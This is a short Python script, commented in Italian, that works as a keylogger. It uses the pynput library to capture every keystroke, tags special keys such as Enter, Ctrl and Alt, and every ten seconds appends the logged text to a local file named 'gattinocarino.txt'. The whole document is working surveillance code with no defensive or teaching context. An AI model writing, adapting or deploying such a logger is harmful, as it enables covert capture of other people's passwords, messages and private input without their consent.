from pynput import keyboard
import threading


gattino_file = "gattinocarino.txt"


text = ""


time_interval = 10


def save_to_file():
    global text
    try:
      
        with open(gattino_file, "a") as f:
            f.write(text)
        # Dopo aver salvato, svuotiamo il contenuto della variabile text
        text = ""
        
        # Impostiamo un timer per eseguire periodicamente questa funzione
        timer = threading.Timer(time_interval, save_to_file)
        timer.start()
    except Exception as e:
        print(f"Errore durante il salvataggio: {e}")

# Funzione per gestire i tasti premuti
def on_press(key):
    global text
    try:
        # Gestiamo tasti specifici come Invio, Tab e Spazio
        if key == keyboard.Key.enter:
            text += "[Enter]"
        elif key == keyboard.Key.tab:
            text += "[Tab]"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            text = text[:-1] if len(text) > 0 else text
        elif key == keyboard.Key.shift:
            text += "[Shift]"
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            text += "[Ctrl]"
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            text += "[Alt]"
        elif key == keyboard.Key.caps_lock:
            text += "[Caps Lock]"
        elif key == keyboard.Key.esc:
            text += "[Esc]"
        else:
            # Se il tasto è un carattere, lo aggiungiamo al testo
            text += str(key.char) if hasattr(key, 'char') else str(key)
    except AttributeError:
        # Per tasti speciali che non hanno 'char'
        text += f"[{key}]"

# Listener della tastiera
with keyboard.Listener(on_press=on_press) as listener:
    # Iniziamo il salvataggio periodico dei dati nel file
    save_to_file()
    listener.join()


